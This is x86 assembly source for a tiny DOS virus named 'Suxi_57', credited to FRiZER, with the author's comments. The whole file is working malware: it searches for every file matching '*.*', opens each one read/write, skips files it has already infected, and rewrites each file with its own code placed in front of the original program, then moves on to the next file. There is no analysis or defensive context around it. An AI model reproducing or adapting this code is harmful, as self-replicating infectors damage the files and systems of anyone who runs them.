;       [ Suxi_57 ]     (c) FRiZER
        .model tiny
        .code
        .startup
s:
        db      '*.*',0         ; sub cx,[002Ah]
        xchg    ax,cx           ; cx = 0
        mov     ah,4Eh          ; find first
        mov     dx,si           ; mask
i:
        int     21h
        jb      i               ; if error => ah = 00 (Terminate Program)
        mov     ax,3D02h        ; open (r/w)
        mov     dx,9Eh          ; name of finded file
        int     21h
        xchg    bx,ax           ; bx = handle
        mov     ah,3Fh          ; read
        push    sp
        pop     cx
        shl     dx,1            ; dx = 13Ch - buffer - afta vir.body
        int     21h
        cmp     [si+3Ch+3],bh   ; is it me ? (zero afta '*.*')
        je      f               ; yes - find next
        add     ax,dx
        push    ax              ; ax - vir.size + prog.size
        mov     ax,4200h
        cwd
        xor     cx,cx
        int     21h             ; lseek 2 begin
        mov     dx,si           ; write vir.body + prog.body
        pop     cx              ; rememba size
        mov     ah,40h
        int     21h
f:
        mov     ah,4fh          ; find next
        jmp     i
e:
        db      'sux'           ; dummy prog ;)))
        end
